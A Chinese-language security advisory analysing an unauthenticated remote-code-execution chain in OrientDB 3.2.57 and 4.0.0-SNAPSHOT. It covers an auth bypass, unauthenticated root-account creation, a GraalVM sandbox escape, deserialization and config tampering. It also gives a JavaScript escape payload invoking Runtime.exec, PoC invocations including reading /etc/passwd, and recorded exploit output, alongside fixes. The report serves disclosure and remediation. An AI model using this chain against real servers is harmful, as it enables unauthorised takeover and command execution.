# OrientDB 未认证远程代码执行（Pre-Auth RCE）漏洞分析报告

> 覆盖 **两个版本**：官方发布版 **3.2.57**（`orientdb:latest`）与仓库开发版 **4.0.0-SNAPSHOT**（`develop`，镜像 `orientdb:4.0.0-SNAPSHOT`）。**两者默认部署均可用同一条前认证链打到底层命令执行**，且本文 PoC（`poc_orientdb_rce.py`）**两个版本通用**（自动识别版本并选择对应的清理方式）。

| 项目 | 内容 |
|---|---|
| 报告日期 | 2026-10-12 |
| 目标 A | OrientDB Community **3.2.57**（tag `3.2.57`，官方镜像 `orientdb:latest`） |
| 目标 B | OrientDB **4.0.0-SNAPSHOT**（仓库 `develop`，HEAD `6557cf28c0`，Java 17；镜像 `orientdb:4.0.0-SNAPSHOT`） |
| 暴露端口 | `2424/tcp` 二进制协议、`2480/tcp` HTTP |
| 组件 | `orientdb-*`、GraalVM JS（3.2.57 = 21.3.5；4.0 = 24.2.2）、studio、etl |
| 风险等级 | **严重（Critical）** |
| CVSS v3.1 | **9.8** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| 结论 | 默认部署下，**无需任何凭据、仅凭网络侧访问**即可实现容器内 **root 权限的任意命令执行** |

> 版本关系：仓库 `develop`（4.0.0-SNAPSHOT）与 `3.2.x`（3.2.57）是**并行的两条线**；`3.2.57` 是已发布 tag，`4.0.0-SNAPSHOT` 是未发布的开发线。本文对 3.2.57 的定位来自**镜像反编译**，对 4.0 的定位来自**源码**。

---

## 1. 摘要

未认证攻击者可通过一组缺陷从网络侧直达服务器进程的**任意 OS 命令执行**：

1. **二进制协议前认证鉴权绕过（VULN-1）** —— 未认证即可调用服务器级操作；
2. **未认证执行 admin 语句（VULN-2）** —— 通过 `SERVER_QUERY` 未认证创建 `ROLE root` 的服务器账号，完全接管服务器；
3. **脚本语言白名单绕过 + GraalVM 沙箱逃逸（VULN-3）** —— 存储型 JavaScript 函数路径不受 `allowedLanguages=[sql]` 约束，且 polyglot 使用 `HostAccess.ALL`，可逃逸到 `Runtime.exec`，以服务器进程身份执行命令。

附带发现：前认证 **Java 反序列化原语（VULN-4）** 与 **未认证全局配置篡改（VULN-5）**。

**关键点**：整条链**纯网络触发**（仅需 TCP 2424 + HTTP 2480），无需进入容器、无需任何本地落点（见第 3 节）。已在 3.2.57 与 4.0.0-SNAPSHOT 上分别端到端复现（见第 7 节）。

---

## 2. 目标默认配置（攻击前提，两版一致）

`config/orientdb-server-config.xml` / `config/security.json` 关键默认值：

| 配置 | 默认值 | 影响 |
|---|---|---|
| `server.createDefaultUsers` | `false` | 无默认口令（root 由 `ORIENTDB_ROOT_PASSWORD` 提供，未设则自动生成） |
| 内置用户 | 仅 `guest`（`server.listDatabases`） | **前认证是唯一入口** |
| `OServerSideScriptInterpreter` | `enabled=true`，`allowedLanguages=SQL`，`allowedPackages=""` | 直接脚本命令限制为 SQL，但函数路径存在绕过（VULN-3） |
| `db.custom.support` | `false` | 反序列化原语默认被门控，但可被未认证打开（VULN-5） |
| 分布式（Hazelcast 2434） | `${distributed}` 未定义 → 关闭 | 不构成默认攻击面 |
| 新建库默认用户 | 无（`admin/admin`、`root/root` 均 401） | 无法用默认口令登录新库 |

---

## 3. 利用条件与攻击面

- **纯网络触发**：仅需可达 `2424/tcp`（二进制）与 `2480/tcp`（HTTP）。**无需登录容器、无需 `docker exec`、无需目标上的任何本地落点。**
- PoC 仅用标准库 `socket` + `urllib`；实测从**独立对等容器**（仅共享 Docker 网桥，不 exec 目标）即可打通（见 7.4）。
- **不需要任何凭据**（前认证）；默认配置即可，不需要管理员改动。
- 命令以**服务器进程身份**执行；两镜像默认以 **uid=0(root)** 运行（无 `USER` 指令），故为**容器内 root**。
- **不是宿主机逃逸**：网络触发本身不会直接获得宿主权限；逃逸仍需额外条件（`--privileged`、挂载 `docker.sock`、内核漏洞等），默认不具备。

---

## 4. 漏洞清单

| 编号 | 名称 | 位置 | 严重性 |
|---|---|---|---|
| VULN-1 | 二进制协议前认证鉴权绕过 | `ONetworkProtocolBinary` / `OConnectionBinaryExecutor` / `OClientConnectionManager` | 严重 |
| VULN-2 | 未认证执行 admin 语句 → 未认证创建 root 账号 | `OServerQueryRequest` / `OrientDBEmbedded.executeAdminStatement` | 严重 |
| VULN-3 | 脚本白名单绕过 + GraalVM `HostAccess.ALL` 逃逸 → RCE | `OPolyglotScriptExecutor` / `OServerSideScriptInterpreter` / `OAbstractScriptExecutor` | 严重 |
| VULN-4 | 前认证 Java 反序列化原语 | `OSerializableWrapper.fromStream` / `ORecordSerializerNetworkV37` | 高 |
| VULN-5 | 未认证全局配置篡改（先赋值后校验） | `OConnectionBinaryExecutor.executeSetGlobalConfig` | 高 |

---

## 5. 详细分析

> 代码行号标注为 `4.0:行` / `3.2.57:行`；3.2.57 行号来自镜像反编译。

### VULN-1 二进制协议前认证鉴权绕过（严重）

**根因**：连接在鉴权前创建、鉴权失败不回收，且对非 token 连接存在**跳过会话校验**的向后兼容分支。

`server/.../network/protocol/binary/ONetworkProtocolBinary.java`
```java
// onBeforeHandshakeRequest(): 鉴权前就注册连接
connection = this.server.getClientConnectionManager().connect(this);   // 4.0:442 / 3.2.57:300
connection.setTokenBytes(null);
connection.acquire();
```
```java
// onBeforeOperationalRequest(): 非 token 连接直接跳过 validateSession()
} else if (connection != null && !Boolean.TRUE.equals(connection.getTokenBased())) {
    connection.setTokenBytes(null);       // 4.0:521-524 / 3.2.57:385-388
    connection.acquire();                 // <-- 未调用 validateSession()
}
```
`server/.../OConnectionBinaryExecutor.java`
```java
// executeConnect(): 先 setTokenBased(false)，再因 no-token 守卫抛异常，且不 disconnect
this.connection.setTokenBased(request.isTokenBased());            // 4.0:962 / 3.2.57:1142
if (!request.isTokenBased()
      && !OGlobalConfiguration.NETWORK_BINARY_ALLOW_NO_TOKEN.getValueAsBoolean()) {
    throw new OConfigurationException("... not supported anymore ..."); // 4.0:965-972 / 3.2.57:1145
}   // 异常抛出后连接仍在 connections 表中（afterOperationRequest 不 disconnect）
```
`server/.../OClientConnectionManager.java`：`connectionSerial` 从 0 自增（4.0:55）；`connect(...)` 只创建不鉴权（4.0:140-150）；`getConnection(id)` 仅按整数查表、**不校验连接归属**（4.0:220-226）。

**触发**：
1. 发送 `REQUEST_CONNECT`(2)，`clientTxId=-1`，协议 <37，`tokenBased=false` → 服务器创建连接（id 为小整数）后抛异常，连接残留；
2. 小整数爆破连接 id 后，`requireDatabaseSession()==false` 且 `requireServerUser()==false` 的请求（`CONFIG_GET/SET`、`SERVER_QUERY`、`CLUSTER`）**免鉴权执行**。

`request.read(...)`（请求体解析）发生在会话/DB 检查**之前**，故反序列化亦前认证可达（见 VULN-4）。两版本行为一致。

### VULN-2 未认证服务器级操作 → 未认证创建 root 账号（严重）

`client/.../message/OServerQueryRequest.java`：`requireServerUser()` 默认 false；`requireDatabaseSession()` 显式 false（4.0:201）。但 `SERVER_QUERY` 执行的是 **admin 语句**：

`core/.../db/OrientDBEmbedded.java`
```java
protected OResultSetReady executeAdminStatement(String script, Map<String,Object> args) {
    OAdminStatement statement = OSQLEngine.parseAdminStatement(script);   // 4.0:1027 / 3.2.57:1219
    ...
}
```
- 4.0 admin 语句：`CREATE/DROP DATABASE`、`CREATE SYSTEM USER`、`EXISTS SYSTEM USER`、**`DROP SYSTEM USER`**、`ALTER SYSTEM ROLE`；
- 3.2.57：同上，但**无 `DROP SYSTEM USER`**（该解析类仅 4.0 有）。
`OCreateSystemUserStatement` 实际执行 `INSERT INTO OUser SET name=?, password=?, status='ACTIVE', roles=(SELECT ...)`。

**后果**：未认证执行 `CREATE SYSTEM USER <u> IDENTIFIED BY '<p>' ROLE root`，即在系统库创建 root 服务器账号，随后 HTTP Basic 登录即可执行任意管理操作。

> `CONFIG_GET` / `CONFIG_SET` / `CLUSTER` 同样在 `requireServerUser()=false` / `requireDatabaseSession()=false` 下前认证可达。

### VULN-3 脚本白名单绕过 + GraalVM 逃逸 → RCE（严重）

**3a. 白名单只在命令路径生效，存储函数路径未覆盖（两版相同）**

`core/.../command/script/OAbstractScriptExecutor.java` —— 拦截器**仅**在 `preExecute` 里触发：
```java
public void preExecute(ODatabaseDocumentInternal database, String script, Object params) {
    interceptors.forEach(i -> i.preExecute(database, language, script, params));   // 4.0:35-37
}
```
`polyglot/.../OPolyglotScriptExecutor.java`：
```java
public OResultSet execute(...)   { preExecute(database, script, params); ... }   // 4.0:115 / :129  ← 触发拦截器
public Object executeFunction(...) { /* 无 preExecute 调用 */ ... }              // 4.0:151-184       ← 绕过白名单
```
- 直接命令路径 `POST /command/{db}/javascript/...` → 被拦（`Language 'js' is not allowed`）；
- 但 **`CREATE FUNCTION ... LANGUAGE javascript` + `POST /function/{db}/{fn}`** → JS **直接执行**，未经白名单（3.2.57 与 4.0 实测均是）。

**3b. `HostAccess.ALL` 逃逸（两版相同）**

`polyglot/.../OPolyglotScriptExecutor.java`
```java
Context.newBuilder()
    .allowHostAccess(HostAccess.ALL)   // 4.0:78 / 3.2.57 同
    .allowHostClassLoading(false)
    .allowHostClassLookup(s -> allowedPackages.contains(s))   // allowedPackages 为空 -> 禁按名查找
    .build();
```
即使禁止按名查找 `java.io.File`/`java.lang.Runtime`，`HostAccess.ALL` 仍允许对绑定进脚本的宿主对象（`db` = `OScriptDatabaseWrapper`）**调用其任意 public 方法**：
```js
var cl = db.getClass().getClassLoader();        // 拿到应用类加载器
var rt = cl.loadClass("java.lang.Runtime");     // loadClass 不受 allowedPackages 限制
var r  = rt.getMethod("getRuntime").invoke(null);
var p  = r.exec(["sh","-c", CMD]);              // 任意命令，读取 stdout 返回
```

**后果**：以服务器进程身份（默认 **root**）执行任意 OS 命令。

### VULN-4 前认证 Java 反序列化原语（高）

`sessionRequest()` 中 `request.read(...)` 在 `requireDatabaseSession`/`checkServerAccess` 检查**之前**执行；`ORecordSerializerNetworkV37` 的 `CUSTOM` 分支经 `OSerializableWrapper.fromStream` 到达 `readObject()`（两版相同，4.0 已加 `OSerializableStream` 接口校验但 `OSerializableWrapper` 仍可达）：
```java
// OSerializableWrapper.java
serializable = (Serializable) reader.readObject();   // :47，无过滤
```
门控 `db.custom.support` 可被未认证打开（VULN-5）；通过记录/参数携带 `OType.CUSTOM` 字段即可前认证触发。实测服务端日志：
```
Caused by: ODatabaseException: Error on deserialization of Serializable
  at ...OSerializableWrapper.fromStream(OSerializableWrapper.java:50)
  at ...ORecordSerializerNetworkV37.deserializeValue(ORecordSerializerNetworkV37.java:360)
Caused by: java.lang.ClassNotFoundException: <attacker class>
  at ...OSerializableWrapper.fromStream(OSerializableWrapper.java:47)
```
（社区包默认 classpath 无现成 gadget；原语本身前认证可达。）

### VULN-5 未认证全局配置篡改（高）

`server/.../OConnectionBinaryExecutor.java`
```java
public OBinaryResponse executeSetGlobalConfig(OSetGlobalConfigurationRequest request) {
    final OGlobalConfiguration cfg = OGlobalConfiguration.findByKey(request.getKey());
    if (cfg != null) {
        cfg.setValue(request.getValue());                 // 4.0:1197  <-- 先赋值
        if (!cfg.isChangeableAtRuntime())                 // <-- 后校验，抛错但副作用已生效
            throw new OConfigurationException("... cannot be changed at runtime ...");
    }
    ...
}
```
`OSetGlobalConfigurationRequest.requireDatabaseSession()=false`，且无 server user 校验 → 前认证可写任意全局配置（例如把 `db.custom.support` 置 `true`，为 VULN-4 铺路；实测写入后读回为 `true`）。两版一致。

---

## 6. 完整利用链

```
[未认证] TCP 2424
   │  REQUEST_CONNECT(clientTxId=-1, tokenBased=false)
   ▼
[VULN-1] 连接在鉴权前创建、失败不回收 → 残留 tokenBased=false 连接
   │  爆破连接 id
   ▼
[VULN-2] REQUEST_SERVER_QUERY("CREATE SYSTEM USER x IDENTIFIED BY 'p' ROLE root")   ← 无凭据
   │  (可选 [VULN-5] CONFIG_SET db.custom.support=true；[VULN-4] 触发 readObject)
   ▼
[获得 root 服务器账号]
   │  HTTP 2480 登录 → 建库
   ▼
[VULN-3] CREATE FUNCTION ... LANGUAGE javascript            (绕过 allowedLanguages=[sql])
   │  POST /function/{db}/{fn}                                (GraalVM HostAccess.ALL 逃逸)
   ▼
[Runtime.exec(["sh","-c",CMD])]  →  以 root 执行任意命令
```

---

## 7. 复现验证（3.2.57 与 4.0.0-SNAPSHOT）

PoC 为版本自适应：启动时 `GET /server/version` 指纹识别，并按版本选择清理方式（4.0 用 `DROP SYSTEM USER`，3.2.57 用 `OSystem` 库的 `DELETE FROM OUser`）。

### 7.1 目标 B：4.0.0-SNAPSHOT（从当前仓库构建）
```bash
mvn -DskipTests -Dcheckstyle.skip=true install          # 22 个模块全部 SUCCESS
cp packages/community/target/orientdb-community-4.0.0-SNAPSHOT.tar.gz packages/community/docker/
# Dockerfile 基础镜像改 eclipse-temurin:17-jre（仓库自带为 zulu-openjdk:8）
docker build -t orientdb:4.0.0-SNAPSHOT packages/community/docker
docker run -d --name odb40 -p 2424:2424 -p 2480:2480 orientdb:4.0.0-SNAPSHOT   # 自包含，无需 -e/卷
```
```
[*] target version = 4.0.0-SNAPSHOT
[*] stage 1: binary-protocol auth bypass ...   [+] unauthenticated connection id = 82
[*] stage 2: enable db.custom.support (unauth config tamper)
[*] stage 3: create server ROOT user (unauth)   [+] root user created
[*] stage 6: invoke function -> id; hostname
[+] HTTP 200
========== command output ==========
uid=0(root) gid=0(root) groups=0(root)
4660e38bc61f
====================================
[*] stage 7: cleanup ...
    DROP DATABASE ccdb_u1o6f          -> status=0 (0=ok)
    delete account via DROP SYSTEM USER   -> status=0
    db.custom.support -> 'false'
[+] verify: login as deleted account -> HTTP 401 (401 = removed)
```

### 7.2 目标 A：官方发布版 3.2.57
```bash
docker run -d --name odb32 -e ORIENTDB_ROOT_PASSWORD=root \
  -p 3424:2424 -p 3480:2480 orientdb:latest   # 官方镜像需提供 root 口令
```
```
[*] target version = 3.2.57
[*] stage 1: binary-protocol auth bypass ...   [+] unauthenticated connection id = 3
[*] stage 3: create server ROOT user (unauth)   [+] root user created
[*] stage 6: invoke function -> id; hostname
[+] HTTP 200
========== command output ==========
uid=0(root) gid=0(root) groups=0(root)
432e2d8e3c71
====================================
[*] stage 7: cleanup ...
    DROP DATABASE ccdb_hhtzu          -> status=0 (0=ok)
    delete account via DELETE FROM OUser  -> 200
    db.custom.support -> 'false'
[+] verify: login as deleted account -> HTTP 401 (401 = removed)
```

### 7.3 结论
两版本均：**未认证 → 未认证创建 root 账号 → 存储 JS 函数（绕过 `[sql]` 白名单）+ GraalVM `HostAccess.ALL` 逃逸 → 以 root 执行命令**，且清理后目标回到初始态（系统用户仅 `root`/`guest`）。

### 7.4 纯网络侧证明（不进入目标容器）
从**独立对等容器**（仅共享 Docker 网桥，不 exec 目标）对目标 IP 运行同一 PoC：
```
target IP = 172.17.0.2
[+] HTTP 200 -> uid=0(root) ... NETWORK_ONLY_RCE
```
→ 证明**无需进入容器**，仅凭 2424/2480 端口即可利用。

### 7.5 前认证反序列化证据（服务端日志）
```
Caused by: ODatabaseException: Error on deserialization of Serializable
    at ...OSerializableWrapper.fromStream(OSerializableWrapper.java:50)
    at ...ORecordSerializerNetworkV37.deserializeValue(ORecordSerializerNetworkV37.java:360)
Caused by: java.lang.ClassNotFoundException: Gen$Payload
    at ...OSerializableWrapper.fromStream(OSerializableWrapper.java:47)
```

> 说明：PoC 中若出现 `docker exec`，仅为**观察/取证**（查看落地文件、日志、残留状态），不属于利用链。

---

## 8. 运行身份说明（root 的来源）

- 两镜像均无 `USER` 指令（`Config.User=[]`）；PID 1 的 JVM 以 `uid=0` 运行；启动脚本（`bin/server.sh`）无降权（无 `su`/`gosu`/`runuser`）。
- 故 RCE 得到的是**容器内默认 root**，非提权所得；**不等于宿主 root**。

---

## 9. 修复建议

**代码层**
1. 连接必须在鉴权成功后才创建；`executeConnect`/`executeDatabaseOpen` 失败立即断开。
2. backward-compat 分支必须要求该连接此前已通过会话校验（引入 `authenticated` 标志），不能仅凭 `tokenBased != TRUE`。
3. `getConnection(id)` 校验连接归属（protocol/socket），防 id 猜测/会话劫持。
4. `SERVER_QUERY`/admin 语句、`CONFIG_GET/SET`、`CLUSTER` 必须要求 server user。
5. **脚本白名单必须覆盖 `OFunction.execute → executeFunction` 路径**（当前只在 `execute` 的 `preExecute` 里触发）。
6. `OPolyglotScriptExecutor` 禁用 `HostAccess.ALL`，改用受限 `HostAccess` 并保留宿主类白名单。
7. `OSetGlobalConfigurationRequest` 的 `setValue()` 必须在 `isChangeableAtRuntime()` 校验之后执行。
8. 反序列化加 `ObjectInputFilter` 白名单，或移除 `OSerializableWrapper.readObject()` 路径。
9. 两个版本线（3.2.x 与 develop/4.0）都需修复并升级。

**部署层（Docker）**
- 以非 root 运行（`USER`/`--user`），禁用 `--privileged`，只读根文件系统、`--cap-drop=ALL`。
- 2424/2480 仅对受信网络开放，前置认证/网关。

---

## 10. 附录：PoC、部署与清理

**PoC**：`poc_orientdb_rce.py`（纯标准库，**版本自适应**；`--keep` 保留现场）
```bash
python3 poc_orientdb_rce.py --cmd "id"
python3 poc_orientdb_rce.py --host <ip> --bin-port 2424 --http-port 2480 --cmd "cat /etc/passwd"
python3 poc_orientdb_rce.py --max-id 8000 --cmd "id"    # 目标运行较久时扩大连接 id 扫描范围
```

> **关于 stage 1（鉴权绕过）的失败**：PoC 需要一个"未认证连接"的内部 id，方法是**爆破小整数 id**（用 `CONFIG_GET` 探测）。这个 id 由服务端全局计数器生成，**随服务运行时间/连接数单调增长**。因此在**长时间运行或被测很多次**的实例上，可能扫不到（报 `no unauthenticated connection id found`）——这**不是漏洞不存在**，而是 PoC 猜测范围不足：
> - 提高上限：`--max-id 8000`（或更大）；
> - 或**重启目标容器**重置计数器后再跑（实测：重启后同一 PoC 立即成功）；
> - 全新实例始终可用。
> PoC 已内置重试（最多 3 轮）与上述提示。

**部署目标 A（3.2.57，官方镜像）**
```bash
docker run -d --name odb32 -e ORIENTDB_ROOT_PASSWORD=root \
  -p 3424:2424 -p 3480:2480 orientdb:latest
```

**部署目标 B（4.0.0-SNAPSHOT，自仓库构建，自包含）**
```bash
mvn -DskipTests -Dcheckstyle.skip=true install
cp packages/community/target/orientdb-community-4.0.0-SNAPSHOT.tar.gz packages/community/docker/
# 仓库自带 Dockerfile 基础镜像为 zulu-openjdk:8，与 Java17 不符 -> 改 eclipse-temurin:17-jre
docker build -t orientdb:4.0.0-SNAPSHOT packages/community/docker
docker run -d --name odb40 -p 2424:2424 -p 2480:2480 orientdb:4.0.0-SNAPSHOT
```

**校验是否清理干净**
```bash
curl -s http://localhost:2480/listDatabases
curl -s -u root:root -X POST http://localhost:2480/command/OSystem/sql --data "SELECT name FROM OUser"
```

**清理（PoC 内置 stage 7，默认开启，版本自适应）**
- `DROP DATABASE`（连带删除函数）；
- 删除系统账号：**4.0.x → `DROP SYSTEM USER`**；**3.2.x → `OSystem` 库 `DELETE FROM OUser WHERE name=?`**（3.2.57 无 `DROP SYSTEM USER` 语法）；失败自动回退到另一种；
- 还原 `db.custom.support=false` → 校验 `401`。

---

## 11. 免责声明
本报告与随附 PoC 仅用于**已获授权的安全测试与漏洞研究**（本机自建实验环境）。请勿用于未授权目标。
